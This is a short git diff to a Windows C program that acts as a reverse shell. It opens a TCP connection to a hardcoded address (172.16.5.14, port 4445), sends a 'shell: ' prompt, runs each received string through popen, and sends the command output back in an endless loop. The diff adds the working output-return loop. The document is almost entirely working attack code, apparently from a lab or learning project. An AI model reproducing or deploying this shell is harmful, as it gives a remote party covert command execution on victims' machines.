@@ -2,18 +2,24 @@
 #include <winsock2.h>
 #include <stdio.h>
 
-#define IP_ADDRESS "10.230.229.13"
+#define IP_ADDRESS "172.16.5.14"
 #define PORT 4445
 #define BUF_LEN 1024
-#define PAYLOAD_SZ 819200
+#define RESPONSE_SZ 128
+
 
 int main() {
+  char prompt[15] = "shell: ";
+  char buf[BUF_LEN] = "";
+  int res = 0;
+  FILE *output;
+  char response[RESPONSE_SZ] = "";
 
   // Initialize Winsock and use version 2.2
   WSADATA wsaData;
   int wResult;
   WSAStartup(MAKEWORD(2,2), &wsaData);
-  
+
   // Create a socket to connect to an IP and port
   SOCKET ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 
@@ -25,17 +31,22 @@ int main() {
 
   // Connect to socket
   connect( ConnectSocket, (SOCKADDR*) &saServer, sizeof(saServer) );
-  
-  // Receive data from port;
-  char buf[BUF_LEN] = "";
-  int res = 0;
-  FILE *output;
 
+  // Receive data from port;
   do {
-  	send_prompt(ConnectSocket);
-    res = recv( ConnectSocket, buf, BUF_LEN, 0 );
+    send( ConnectSocket, prompt, sizeof(prompt), 0);
+    char buf[BUF_LEN] = "";
+    do {
+       res = recv( ConnectSocket, buf, BUF_LEN, 0 );
+    } while (sizeof(buf) == 0);
+    printf("buf = [%s]",buf);
     output = popen(buf, "r");
-    send( ConnectSocket, (char *)output, sizeof(output), 0);
+
+    while (fgets(response, RESPONSE_SZ, output) != NULL) {
+      //response[sizeof(response) -2 ] = 0;
+      send( ConnectSocket, response, RESPONSE_SZ, 0);
+    }
+
     pclose(output);
   } while (1 == 1);
 
